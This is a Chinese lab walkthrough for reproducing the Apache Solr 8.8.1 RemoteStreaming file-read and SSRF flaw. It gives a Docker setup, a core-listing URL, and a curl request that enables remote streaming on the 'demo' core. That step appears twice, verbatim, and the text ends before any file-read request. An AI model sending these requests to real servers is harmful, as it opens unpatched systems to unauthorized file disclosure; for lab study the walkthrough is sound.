# Apache Solr RemoteStreaming 文件读取与SSRF漏洞

## 漏洞环境

执行如下命令启动solr 8.8.1：

```plain
docker compose up -d
```

环境启动后，访问http://your-ip:8983即可查看Apache Solr后台。

## 漏洞复现

首先，访问http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json获取数据库名：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780909174047-21ae8d4c-b229-4666-bdf8-726547166d8b.png)

发送如下数据包，修改数据库demo的配置，开启RemoteStreaming：

```plain
curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' --data-binary $'{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' \
    $'http://your-ip:8983/solr/demo/config'
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780909173907-0cdb53d3-1f3e-496c-af8c-bd63af4e6c6d.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780909173923-c53119fa-6538-482b-8c20-171fd9d5a2a0.png)

发送如下数据包，修改数据库demo的配置，开启RemoteStreaming：

```plain
curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' --data-binary $'{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' \
    $'http://your-ip:8983/solr/demo/config'
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780909174063-37c2c661-3507-49e5-b344-3f91ecc67195.png)